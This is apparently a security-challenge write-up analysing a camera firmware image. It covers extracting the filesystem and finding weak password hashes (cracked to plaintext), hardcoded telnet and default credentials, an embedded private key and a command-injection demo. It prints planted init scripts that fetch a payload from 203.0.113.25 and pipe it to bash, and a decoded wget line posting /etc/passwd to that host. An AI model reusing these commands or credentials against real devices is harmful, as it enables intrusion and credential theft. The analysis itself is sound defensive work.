# sampada-2025
# Firmware Analysis Progress Report

## **Introduction**
This report documents the steps undertaken in analyzing the firmware image `chakravyuh.bin` as part of a security challenge. The goal is to extract the firmware, explore its filesystem, and identify potential vulnerabilities.

---

## **Step 1: Initial Analysis with Binwalk**
The firmware image was initially analyzed using `binwalk`, a tool for inspecting and extracting embedded files and filesystems from binary images.

### **Command Used**:
    binwalk -e chakravyuh.bin
 

### **Findings**:
- The firmware contained a `uImage` Linux kernel header and a SquashFS filesystem.
- Extraction failed initially due to issues with the SquashFS filesystem.

---

## **Step 2: Extracting the Filesystem**
### **Corrupted SquashFS Filesystem**:
Attempts to manually extract the SquashFS filesystem using `unsquashfs` failed due to corruption. The following error was encountered:
lzma uncompress failed with error code 9
read_block: failed to read block @0x15142b5
read_fragment_table: failed to read fragment table index
FATAL ERROR: File system corruption detected.
 
As a result, the `squashfs-root` directory was empty after extraction.

### **Resolution with Sasquatch**:
To address this, `sasquatch`, a tool for extracting non-standard SquashFS filesystems, was installed and used.

#### **Steps Taken**:
1. Installed dependencies:
# 
    sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
 
3. Cloned and built Sasquatch:
# 
    git clone https://github.com/devttys0/sasquatch
    cd sasquatch
    ./build.sh

 
3. Applied a patch to resolve build errors:
# 
    wget https://raw.githubusercontent.com/devttys0/sasquatch/82da12efe97a37ddcd33dba53933bc96db4d7c69/patches/patch0.txt
    mv patch0.txt patches/
    ./build.sh


### **Result**:
Successfully extracted the SquashFS filesystem from the firmware image.

---
Trying to extract IP Addresses - 
#
    grep -r -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' .

## **Step 3: Exploring the Extracted Filesystem**
After extraction, I navigated through the extracted filesystem to identify interesting files and directories.

### **Filesystem Structure**:
The root directory contained standard Linux directories such as `/bin`, `/etc`, `/lib`, `/usr`, along with specific directories like `/web`, `/Wireless`, and `/SigFileList`.

### **Key Findings in `/etc` Directory**:
1. **`passwd` File**:
#
    cat /etc/passwd
 
Output:
```root:$1$jSqQv.uP$jgz4lwEx2pnDh4QwXkh06/:0:0:root:/:/bin/sh```
 
- The root user password hash is stored in MD5 format (`$1$`), which is considered weak.
- This hash can potentially be cracked using tools like `John the Ripper`.



3. **No Shadow File**:
- The absence of an `/etc/shadow` file indicates that password hashes are stored directly in `passwd`, which is less secure.

---

## **Step 4: Identifying Camera Model**
Using the `file` command, I identified details about the camera model embedded in the firmware:

### **Command Used**:
    file chakravyuh.bin
```chakravyuh.bin: u-boot legacy uImage, hi3520Dromfs, Linux/ARM, OS Kernel Image (gzip), 13144064 bytes, Wed Nov 29 14:28:44 2017, Load Address: 0XA0060000, Entry Point: 0XA0DA0000, Header CRC: 0X71FF3C3D, Data CRC: 0X3F9F5075```

### **Findings**:
- The firmware references `hi3520Dromfs`, indicating it is based on HiSilicon's Hi3520D chip, commonly used in IP cameras.
- This suggests that the device might be an IP camera or similar hardware.

## **Step 5: Wireless Configuration**
The file `/etc/Wireless/RT2870STA/RT2870STA.dat` contains wireless configuration details. 

### **Contents of RT2870STA.dat**:
```
#The word of "Default" must not be removed
Default
CountryRegion=5
CountryRegionABand=7
CountryCode=
ChannelGeography=1
SSID=11n-AP
NetworkType=Infra
WirelessMode=5
Channel=0
BeaconPeriod=100
TxPower=100
BGProtection=0
TxPreamble=0
RTSThreshold=2347
FragThreshold=2346
TxBurst=1
PktAggregate=0
WmmCapable=1
AckPolicy=0;0;0;0
AuthMode=OPEN
EncrypType=NONE
WPAPSK=
DefaultKeyID=1
Key1Type=0
Key1Str=
Key2Type=0
Key2Str=
Key3Type=0
Key3Str=
Key4Type=0
Key4Str=
PSMode=CAM
AutoRoaming=0
RoamThreshold=70
APSDCapable=0
APSDAC=0;0;0;0
```
...
## Step 6- The real fun begins >:)
The path `etc/init.d/` has these bash scripts- 
#
    ls etc/init.d/
```S00devs  S01udev  S02wndev  S80network  S81toe  S99dh  rcS```

The rcS script executes all other scripts in `etc/init.d`
### **S02wndev**
The `S02wndev` script is interesting - 
```
#!/bin/bash

echo "service daemon packages..."

wget -O http://203.0.113.25/daemon

if [ $? -eq 0 ]; then
    echo "Download completed successfully."
else
    echo "Download failed."
fi

mv daemon /tmp/

echo "service daemon installed successfully"
```
This script attempts to download a file named daemon from an external IP address (203.0.113.25) and moves it to /tmp/.
<details>
<summary>Going to /tmp/ path</summary>
<br>
#
    
    $ cd tmp
    $ ls
        daemon  daemon1  daemon2  wireless
    $ cat daemon
        W1sgLWYgL2V0Yy9wYXNzd2QgXV0gJiYgd2dldCAtLW1ldGhvZD1QT1NUIC0taGVhZGVyPSJDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEiIC0tYm9keS1maWxlPS9ldGMvcGFzc3dkICJodHRwOi8vMjAzLjAuMTEzLjI1LyI

The `daemon` seems like base64, so I decoded it and got this - 
#
    [[ -f /etc/passwd ]] && wget --method=POST --header="Content-Type: multipart/form-data" --body-file=/etc/passwd "http://203.0.113.25/"
</details>

### **S80network**
This script parses network configuration parameters from /proc/cmdline. It configures the network interface, enables Telnet (telnetd), and executes a hidden decryption script (/usr/sbin/.dec.sh) on the downloaded service daemon.
```
... More stuff up here
ifconfig lo 127.0.0.1
ifconfig eth0 up
telnetd

SERVICE_DAEMON="/tmp/daemon"
bash "$DEC" $SERVICE_DAEMON | bash
```

### S99dh
This script mounts multiple partitions, including JFFS2, CRAMFS, and RAMFS filesystems, and extracts sensitive files using p7zip. It also sets up PPPoE configuration files and starts network services like net3g.
```
mount -t jffs2 /dev/mtdblock5 /mnt/mtd -o sync
p7zip x /usr/lib/lib.7z /var/
p7zip x /usr/bin/Challenge.7z /var/
chmod -R 777 /var/*
dvrhelper /var/Challenge
```

### **Analysis**:
- The SSID is set to `11n-AP`.
- Authentication mode is set to `OPEN`, and encryption type is `NONE`.
- No WPA pre-shared key (`WPAPSK`) or WEP keys are configured.
- This lack of encryption indicates an insecure wireless setup, which could allow unauthorized access to the network.
---

## **Challenges Encountered**
1. **Corrupted SquashFS Filesystem**:
   - The manual extraction of the SquashFS filesystem using `unsquashfs` failed due to corruption, as indicated by errors during decompression.
   
2. **Resolution with Sasquatch**:
   - Successfully overcame this issue by using `sasquatch`, which is designed for non-standard or corrupted SquashFS filesystems.

---
# Vulnerabilities

## Exposed Credentials
Telnet credentials found in cleartext in `/usr/etc/telnet_cfg`
```
username=aditya
passwd=BXw6K8YB
```

## Exposed Private Key
```
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/data/ssl$ ls
ca.crt  ca.key  cacert.pem  privkey.pem  pubkey.pem
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/data/ssl$ cat privkey.pem
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHzBJBgkqhkiG9w0BBQ0wPDAbBgkqhkiG9w0BBQwwDgQIc2H4GvZuEVMCAggA
MB0GCWCGSAFlAwQBKgQQ9Kw+XgzsGnGNAQPLfd7TdASCBNB9rOfOs8GwNUM++AJI
PZ02fzfI2KawLLjJNAddqpjwpfTzLxNSo8IBubYZJMFkOKzQmva6cwjxeaQ/f/2C
4MrTFiU0IKmTvWOSjLkSVt93e8fN4sbBf7n2c4lNC8NEUrWqE00d9EeW+WuyPqW1
9EukswWYafRNXLufDgx+O/2mWoO94bzqS0lyhLlVz02DJFSs403WuYlmzGSqiSWI
kL9CPdYa9fHfZX4fIF62HMFCbZKMGCmaXJutpi96jeDezbke1dIeg/c0YTt+vLRT
QDp2LKHhxrFdQA+VH9dWgGirlHjAcsLyRYmaiJjs3fAeXwRDzQejaGdVo4VNqPGQ
CJDqIAjCuaGTOCmw/Pr3vb0XGLEL4xFYeocJAoA/AidvyJgCIPvVdGDUolJv44w6
VNh85w1rfKQMW3fSrs7zS74WBAwP2Tk9iC+2nv29hKzVbqBApDgXsD+56i6FBtVx
fDKxUppcx2tcP3lDzEX7QNL7xY4rrAaBPZ28VMwKGG2X+bo0ruT1pkItuEqLCxBS
+si/cemicO9N/gEKF1c9BOx82IsuWBpYzhYYnAVy2rw9dcQF+SdspetwWCKkX2FD
zM0AaDLwrVFwK3lE2WqEkootGBbxbCpT3tPeYya4ybs4iFinMdbgITZnv7sJs9EU
02oKALfxbdHa3dFWGTUYmlG84GOfowvEWMM6WdJ6B16E/hYvW2hZIMf7+aT1w+5+
9RWFFgzqBl8K9D/aZdIn2h9ekNIxdIUYPO8DfRqwU4BP0lVI1q3wYwT6vuuR1GZ5
pR+sJnkw/h+a5ZUIqZkLJWxwmTOTZNEAimCR0yjjTeVm1qQ0nY2u++UYVEKk2HpU
NrDpgQ+l+Asecu6iA619WUQX+hDi4lIO2OHI1vN8xFuoWw9B3qr85ySHHkQAvaaq
bbqLxcGFZ1MK51qdlEBwjbFFOoj+tPx6SrqWIAJNfAcyFquAW3cMiRk+R9W00Vh1
1dYKwB8/VyiS94yLkUuDN55CaXH3i1ljEIrAoc6G8xTM2s5UUwESghMOLBT5Yozq
BI4pkgecsLNj9iRnLaM7RFxptjgrLVysp6iKtWn6r9ODFzf0wuF+Cwz709SUsuFi
iTFEdYNzBM4njQTuuI1XAa1WaWcfW0bdIIiHOP4ls1bwfAHQejt2YW1f4HYvsCyA
hDulztcUaC2J/aC2M6uO0t92fPsm3YmBRD087WNDGCex86XMm6FmEd287JaNffqj
poB7tbOk5kFulstIR09WjUBSOv4t4ufNIWSn1J9T5RYrGzhdD8gT1258OQhnALRH
R4hG+7a41LphN5lC+1P6BECIjwrcune2FqrGIChGMW7k3xvwJwsq3fd5N12hRv/y
sSj84mmfr1tImLfAphd4yOY2hgqUNIL+JwPIbfdbGHUx1PG2TzXD3qxyr55MPV13
U3IpXW8lSyjKonFgJwjZl8S5mxQQC3LYTiUT+uheR/4uqLQ1HYgSRkguFeBWVOX0
FctNLuu55vz/WiKVKMnrbhPT9JgjwZC2rsvQT4cJK2EWXuftMPA6u0G13yCkKZav
KDHq8D7VDl7l4iOR959tm8FFb7w+uuvFyWPpve5Wz1l0QVjfK2SWRZOzuNOxnti9
kFtUTg+C6T2n6aA+1PyAqZFGWg==
-----END ENCRYPTED PRIVATE KEY-----
```

Password reset key - 
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin/ssl$ cat pwdreset.pem
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA3RuR12tA3aFoIFJSekw1e9+Tc5JaJ3FczvFyQF4SmdK+XrHLnNlP
WCOrsok1neg7Tqbj09Y5AFmqxAhhHrPsZD+6lvBMr1QUHR+DsGQKxR10BuUOjn5B
z4g8PGjuFxYxE6UzKO8cYaUgcgVp9P1/kdnW/PZwNyJAwLwRpZUIOgs3636CH2UO
W3wMpjGu1nMB8PAQ4+v6dUC/jB5JoJrgEgRl94n5iwIJt+f38/ZXoL+DJOb6Q2UI
SjdjKtaRRxpeaSbFw/J7CZodcyTlNXOMx3n+ikUwtKw5iEdoRr9iq69WgqY0bd+O
9pWKE32swy6QXJaumiREjMQTHAtiB2y+qwIDAQAB
-----END RSA PUBLIC KEY-----

# 
    jay@5UD0-WH04M1:ü/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin$ qemu-arm -L $(realpath ../../) ./DahuaExec
    ./DahuaExec: cache '/etc/ld.so.cache' is corrupt
    DahuaExec usage : need 2 arguments, line : 81
    DahuaExec command is :


Leaks credentials
#
    /usr/data$ cat config.lua
```
...
 -- group
        INI_GROUP_NAME_ADMIN            = "admin";
        INI_GROUP_NAME_USER             = "user";
        -- user
        INI_SYS_USER_ADMIN              = "admin",
        INI_SYS_USER_ADMIN_PWD          = "admin",
        INI_SYS_USER_LOCAL              = "888888",
        INI_SYS_USER_LOCAL_PWD          = "888888",
        INI_USER_USER_LOCAL             = "666666",
        INI_USER_USER_LOCAL_PWD         = "666666",
        INI_DEFAULT_USER_NAME           = "default",
        INI_DEFAULT_USER_PWD            = "tluafed",
...
```
DahuaExec is vulnerable to Command Injection - 
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin$ qemu-arm -L $(realpath ../../) ./Dahua
    Exec /bin/ls /tmp
    ./DahuaExec: cache '/etc/ld.so.cache' is corrupt
    DahuaExec command is : ./DahuaExec /bin/ls /tmp
    1test  Challenge  DahuaExec  lua  secboot  ssl
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin$ qemu-arm -L $(realpath ../../) ./DahuaExec /bin/pwd /tmp
    ./DahuaExec: cache '/etc/ld.so.cache' is corrupt
    DahuaExec command is : ./DahuaExec /bin/pwd /tmp
    /home/jay/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin


## /etc/passwd & /etc/passwd-
1. **Backup Password File (`passwd-`)**:
#
    cat /etc/passwd-
 
Output:
```root:ab8nBoH3mb8.g:0:0::/root:/bin/sh```
 
- This file contains another hash format for the root password.
- The type is DES and it has been CRACKED! THE PASSWORD IS - `helpme`
- It had the salt `ab`

  Python Script to verify -
  #
        import crypt

        password = "helpme"
        salt = "ab"
        
        des_hash = crypt.crypt(password, salt)
        
        print("DES Hash:", des_hash)

    Output of python program - `DES Hash: ab8nBoH3mb8.g`
    - ✅ Matches with the hash we found earlier. 

2. **Main Password File (`passwd`)**
# 
    cat /etc/passwd

Output: 
```root:$1$jSqQv.uP$jgz4lwEx2pnDh4QwXkh06/:0:0:root:/:/bin/sh```

- This file contains an MD5 hash with salt `$1$jSqQv.uP`
- It has been CRACKED! THE PASSWORD IS - `vizxv`

  Python script to verify -
  #
        import crypt
        
        password = "vizxv"
        salt = "$1$jSqQv.uP"
        
        des_hash = crypt.crypt(password, salt)
        
        print("MD5  Hash:", des_hash)

  
  Output of python program - `MD5  Hash: $1$jSqQv.uP$jgz4lwEx2pnDh4QwXkh06/`
  - ✅ Matches with the hash we found earlier. 

## Other interesting folders
#
     cd usr/data  
#
    cd etc/Wireless/RT2870STA/
    cat RT2870STA.dat
# 
    cat etc/services
    

# 
    cd usr/lib/lib.7z.extracted/0/lib
    ls

# 
    cd web/config/
    cat index.htm | less

- Stores username and password in base64 based on - `g_basePassword = Base64.encode(username + ':' + password);` 
- Allows weak passwords - `var g_supportWeakPassword = true;//是否允许添加弱密码，默认是支持的`
- IP - 
```
function loginOCX(usr, pwd, type, logintype)
{
        var ret = 0;
        //var ip = '172.8.1.176';
        var ip = location.hostname;
        var username = usr;
        var password = pwd;
        var tcpPort = capTcpPort;
        g_netType = type;
        g_ocx.SetModuleMode(g_netType==0?1:10);
        ret = g_ocx.LoginDeviceEx(ip, tcpPort, username, password, logintype);

        if (ret == 0)
        {
                g_LoginId = g_ocx.GetLoginID();
        }
        return ret;
}
```
- An old comment - `//兼容明文username=admin&password=admin`

# 
    cd usr/etc/
    cat Global.lua
    

## Analyzing the Challenge file

# 
    strings Challenge | grep "Don't"
# 
    strings Challenge | grep "decrypt"
# 
    strings Challenge | grep "passwd"
# 
    strings Challenge | grep "pass"


# 
     binwalk Challenge
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, ARM, version 1 (SYSV)
9027          0x2343          mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
4459185       0x440AB1        Certificate in DER format (x509 v3), header length: 4, sequence length: 3
10739693      0xA3DFED        Certificate in DER format (x509 v3), header length: 4, sequence length: 8193
15868101      0xF220C5        Certificate in DER format (x509 v3), header length: 4, sequence length: 5376
16699672      0xFED118        SHA256 hash constants, little endian
16982745      0x10322D9       Certificate in DER format (x509 v3), header length: 4, sequence length: 596
18819517      0x11F29BD       Unix path: /usr/data/Data
18820409      0x11F2D39       Unix path: /usr/data/Data_4K
18820480      0x11F2D80       Unix path: /usr/data/Data_4K /var/Data
18822059      0x11F33AB       Unix path: /usr/bin/lua/init.lua
18823369      0x11F38C9       Unix path: /usr/data/ssl
18823446      0x11F3916       Unix path: /var/ssl/cacert.pem
18834757      0x11F6545       HTML document header
18835177      0x11F66E9       HTML document header
18835228      0x11F671C       HTML document header
18845286      0x11F8E66       Unix path: /var/tmp/osd.bmp.tmp
18846828      0x11F946C       HTML document header
18850237      0x11FA1BD       HTML document header
18850346      0x11FA22A       HTML document header
18850986      0x11FA4AA       HTML document header
18851106      0x11FA522       HTML document header
19013630      0x1221FFE       Unix path: /usr/bin/ssl/cacert.pem
19034378      0x122710A       Unix path: /usr/bin/ssl/pwdreset.pem
19039089      0x1228371       Base64 standard index table
19074465      0x1230DA1       Unix path: /var/tmp/export_
19184596      0x124BBD4       Unix path: /usr/data/player/SmartPlayer.exe
19268100      0x1260204       Unix path: /var/ssl/ca.crt
19295379      0x1266C93       Unix path: /home/wangdx/gbe_jpeg/Photo.jpg
19305657      0x12694B9       Unix path: /usr/data/Data/info_ver0.bmp
19306866      0x1269972       Unix path: /usr/data/Data/config0.bmp
19310865      0x126A911       Unix path: /usr/data/Data/advanced_netcamera0.png
19314942      0x126B8FE       Unix path: /usr/data/Data/sharePicture/PcapStart_normal.png
19318111      0x126C55F       Unix path: /usr/data/Data/gbkpy.mb
19319520      0x126CAE0       Unix path: /usr/data/Data/info_log0.bmp
19322649      0x126D719       Unix path: /usr/data/Data/sharePicture/tip.bmp
19324106      0x126DCCA       Unix path: /usr/data/Data/sharePicture/signal1.bmp
19326691      0x126E6E3       Unix path: /usr/data/Data/player/play_frame_repeat.png
19328005      0x126EC05       Unix path: /usr/data/Data/player/fileLocked.bmp
19330543      0x126F5EF       Unix path: /usr/data/Data/search0.png
19330682      0x126F67A       Unix path: /usr/data/Data/player/tagmanage_normal.png
19340528      0x1271CF0       Unix path: /usr/data/Data/afterSaleService/DahuaTechnology.png
19344070      0x1272AC6       Unix path: /usr/data/Data/DeviceSecurity/progress%d.png
19373440      0x1279D80       Unix path: /usr/data/Data/RealPlay/realplay_normal.png
19376615      0x127A9E7       Unix path: /usr/data/Data/RealPlay/play_normal.png
19376848      0x127AAD0       Unix path: /usr/data/Data/sharePicture/channel_state_record.bmp
19458747      0x128EABB       Unix path: /usr/data/Data/guiCtrls/netCameraButton.bmp
19461133      0x128F40D       Unix path: /usr/data/Data/player/bmp_time.png
19465172      0x12903D4       Unix path: /usr/data/Data/ptzext/highspeed_normal.png
19468759      0x12911D7       Unix path: /usr/data/Data/sharePicture/radio_tab_normal.png
19471115      0x1291B0B       Unix path: /usr/data/Data/RealPlay/play_selected.png
19472987      0x129225B       Unix path: /usr/data/Data/RealPlay/block_disable.png.png
19478534      0x1293806       Unix path: /usr/data/Data/guiCtrls/zhaohuimima_normal.png
19478959      0x12939AF       Unix path: /usr/data/Data/colorSettingPage/colorSet_normal.png
19487402      0x1295AAA       Unix path: /usr/data/Data/NavigationBar/tour_disable_normal.png
19490788      0x12967E4       Unix path: /usr/data/Data/usbDetectPage/usb_disk.png
19552804      0x12A5A24       Unix path: /usr/data/Data/sharePicture/config_net0.bmp
19556486      0x12A6886       Unix path: /usr/data/Data/sharePicture/bmp_tip.bmp
19557473      0x12A6C61       Unix path: /usr/data/Data/gui32/left_normal.bmp
19563096      0x12A8258       Unix path: /var/tmp_dir/Config
19564032      0x12A8600       Unix path: /var/tmp_dir/Config/Config1
19567734      0x12A9476       Unix path: /usr/data/Data/checkbox/checkbox01.png
19569944      0x12A9D18       Unix path: /usr/data/Data/info_hdd0.png
19572366      0x12AA68E       Unix path: /usr/data/Data/config_net0.png
19576143      0x12AB54F       Unix path: /usr/data/Data/sharePicture/remote_info.notsupport.bmp
19577520      0x12ABAB0       Unix path: /usr/data/Data/config_alarm0.png
19579498      0x12AC26A       Unix path: /usr/data/Data/advanced_hdd0.png
19581427      0x12AC9F3       Unix path: /usr/data/Data/config_gen0.png
19592853      0x12AF695       Unix path: /usr/data/Data/Intell/button_set_normal.bmp
19603156      0x12B1ED4       Unix path: /usr/data/Data/advanced_matrix0.png
19605612      0x12B286C       Unix path: /usr/data/Data/config_md0.bmp
19612121      0x12B41D9       Unix path: /usr/data/Data/info_log0.png
19613966      0x12B490E       Unix path: /usr/data/Data/infoOnlineUserPage/shield_normal.png
19616646      0x12B5386       Unix path: /usr/data/Data/motionSetPage/green_normal.png
19618285      0x12B59ED       Unix path: /usr/data/Data/info_netDetect0.png
19624814      0x12B736E       Unix path: /usr/data/Data/info_ver0.png
19693802      0x12C80EA       Unix path: /usr/data/Resource/FontBin
19702668      0x12CA38C       CRC32 polynomial table, little endian
19716776      0x12CDAA8       Unix path: /var/tmp/pd/CustomTemplate
19754309      0x12D6D45       Unix path: /var/tmp/fisheye
19827704      0x12E8BF8       CRC32 polynomial table, little endian
19830580      0x12E9734       CRC32 polynomial table, little endian
19862176      0x12F12A0       XML document, version: "1.0"
19863717      0x12F18A5       Base64 standard index table
20009300      0x1315154       XML document, version: "1.0"
20083366      0x13272A6       Base64 standard index table
20084495      0x132770F       Base64 standard index table
20089160      0x1328948       Unix path: /usr/data/Data/infoPage/sysinfo_normal.png
20092095      0x13294BF       Unix path: /usr/data/Data/sharePicture/window_bottom.png
20094144      0x1329CC0       Unix path: /usr/data/Data/textbox/textbox1.bmp
20104432      0x132C4F0       Unix path: /usr/data/Data/bmp_desktop_bk.bmp
20107532      0x132D10C       Unix path: /usr/data/Data/player/clip_end_normal.bmp
20186846      0x13406DE       Unix path: /var/tmp/wpa_supplicant-global
20197940      0x1343234       Unix path: /var/tmp/udhcp.pid
20213509      0x1346F05       Base64 standard index table
20348016      0x1367C70       CRC32 polynomial table, little endian
20355228      0x136989C       MySQL MISAM index file Version 3
20384912      0x1370C90       HTML document header
20385019      0x1370CFB       HTML document footer
20385120      0x1370D60       HTML document header
20385161      0x1370D89       HTML document footer
20385267      0x1370DF3       HTML document header
20385333      0x1370E35       HTML document footer
20443336      0x137F0C8       Base64 standard index table
20452726      0x1381576       HTML document header
20452759      0x1381597       HTML document footer
20455563      0x138208B       XML document, version: "1.0"
20464015      0x138418F       XML document, version: "1.0"
20471909      0x1386065       Unix path: /var/tmp/snapshot.jpg
20472047      0x13860EF       Unix path: /var/tmp/snapshot%d.jpg
20475063      0x1386CB7       Copyright string: "copyright" content=""/>"
20533240      0x1394FF8       Unix path: /usr/bin/DahuaExec
20535016      0x13956E8       Unix path: /dev/misc/rtc
20538113      0x1396301       Base64 standard index table
20649242      0x13B151A       Unix path: /var/tmp/udf-head
20664421      0x13B5065       Unix path: /sys/class/scsi_generic/%s/device/block
20675512      0x13B7BB8       Unix path: /usr/data/hardware.lua
20694148      0x13BC484       CRC32 polynomial table, little endian
20695760      0x13BCAD0       CRC32 polynomial table, little endian
20733247      0x13C5D3F       Unix path: /usr/local/bin/seq2dev
20743239      0x13C8447       Unix path: /sys/devices/platform/coretemp.%d/temp%d_input
20747382      0x13C9476       Unix path: /dev/block/mmcblk0p
20753130      0x13CAAEA       Unix path: /dev/block/mmcblk1
20760089      0x13CC619       Unix path: /sys/bus/scsi/devices/
20760634      0x13CC83A       Unix path: /sys/block/mmc%d/size
20760758      0x13CC8B6       Unix path: /sys/class/scsi_host/host%d/proc_name
20774620      0x13CFEDC       CRC32 polynomial table, little endian
20896856      0x13EDC58       CRC32 polynomial table, little endian
20931328      0x13F6300       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/mpi/src/mpi_vb.c
20937964      0x13F7CEC       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/mkp/bind/sys_bind.c
20942264      0x13F8DB8       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/shelf/venc/mpi/mpi_venc.c
20943196      0x13F915C       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/shelf/audio/audio/mpi/src/mpi_adec.c
20945396      0x13F99F4       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/shelf/audio/audio/mpi/src/mpi_aenc.c
20946896      0x13F9FD0       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/mkp/include/valg_ext.h
20952956      0x13FB77C       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/shelf/audio/audio/mpi/src/mpi_ai.c
20954768      0x13FBE90       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/shelf/audio/audio/mpi/src/mpi_ao.c
20958744      0x13FCE18       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/shelf/audio/audio/mpi/audio/audio_voice_adp.c
20960296      0x13FD428       Unix path: /home/y00296035/Hi3531A_V100R001C0xSPC040B030/mpp/code/mpi/jpegd/jpegd_usr.c
20975176      0x1400E48       CRC32 polynomial table, little endian
20992476      0x14051DC       Unix path: /sys/class/net/%s/bonding/slaves
20992656      0x1405290       Unix path: /sys/class/net/%s/bonding/mode
20992744      0x14052E8       Unix path: /sys/class/net/%s/bonding/miimon
20993136      0x1405470       Unix path: /sys/class/net/%s/bonding/primary
20993296      0x1405510       Unix path: /sys/class/net/%s/bonding/active_slave
20994356      0x1405934       Unix path: /sys/class/net/br%d/brif/
21008357      0x1408FE5       Unix path: /var/tmp/wireless_client_socket%d
21010771      0x1409953       Unix path: /var/tmp/wlan_log
21013597      0x140A45D       Unix path: /usr/sbin/usb_modeswitch
21020733      0x140C03D       Unix path: /var/tmp/wpa_supplicant/
21022054      0x140C566       Unix path: /var/tmp/wpa_supplicant/%s
21023468      0x140CAEC       Unix path: /var/tmp/wpa_ctrl_%d-%d
21025914      0x140D47A       Unix path: /var/tmp/aptest.conf
21026173      0x140D57D       Unix path: /var/tmp/hostapd/
21027176      0x140D968       Unix path: /var/tmp/ap.%s.pid
21040788      0x1410E94       Copyright string: "Copyright (c) 2003-2015, Jouni Malinen <j@w1.fi> and contributors"
21041356      0x14110CC       Copyright string: "copyright"
21041491      0x1411153       Copyright string: "copyright"
21041691      0x141121B       Copyright string: "copyright holder(s) nor the"
21050584      0x14134D8       Neighborly text, "neighbor report timeout"
21050623      0x14134FF       Neighborly text, "neighbor report - NONErding neighbor report with token %d (expected %d)"
21050657      0x1413521       Neighborly text, "Neighbor Reportd (expected %d)"
21050692      0x1413544       Neighborly text, "neighbor report with token %d (expected %d)ghbor report"
21050752      0x1413580       Neighborly text, "neighbor report: No connection, no RRM."
21050783      0x141359F       Neighborly text, "neighbor report (token = %d)o RRM in current connection."
21050904      0x1413618       Neighborly text, "Neighbor Report. callback."
21050929      0x1413631       Neighborly text, "Neighbor Report request must provide a callback.ly handling previous Neighbor Report."
21051013      0x1413685       Neighborly text, "Neighbor Report.est"
21051056      0x14136B0       Neighborly text, "Neighbor Report Requesttoken=%d"
21051085      0x14136CD       Neighborly text, "Neighbor report request (for %s), token=%dNeighbor Report Request"
21051148      0x141370C       Neighborly text, "Neighbor Report Request Not associated"
21065060      0x1416D64       Unix path: /sys/class/net/%s/phy80211/name
21087388      0x141C49C       Unix path: /sys/class/net/%s/brport/%s
21101588      0x141FC14       Unix path: /sys/class/net/%s/brport/bridge
21207684      0x1439A84       Base64 standard index table
21212924      0x143AEFC       Neighborly text, "Neighboring BSS: %02x:%02x:%02x:%02x:%02x:%02x freq=%d pri=%d sec=%dec=%d"
21220182      0x143CB56       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/VideoAnalyse.c
21221826      0x143D1C2       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/sys/iva_sys.c
21222990      0x143D64E       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/comm/Iva_RingBuffer.c
21224168      0x143DAE8       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/dsp/dsp_device.c
21228318      0x143EB1E       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/dsp/dsp_ipc_bypass.c
21228810      0x143ED0A       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/dsp/dsp_ipc.c
21229933      0x143F16D       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_ComVideAnalyse.
21232413      0x143FB1D       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_DeedAnalyse.c
21236028      0x144093C       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_FaceDete.c
21236658      0x1440BB2       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_VideoSynopsis.c
21238903      0x1441477       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_PersonCount.c
21239890      0x1441852       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_PlateDete.c
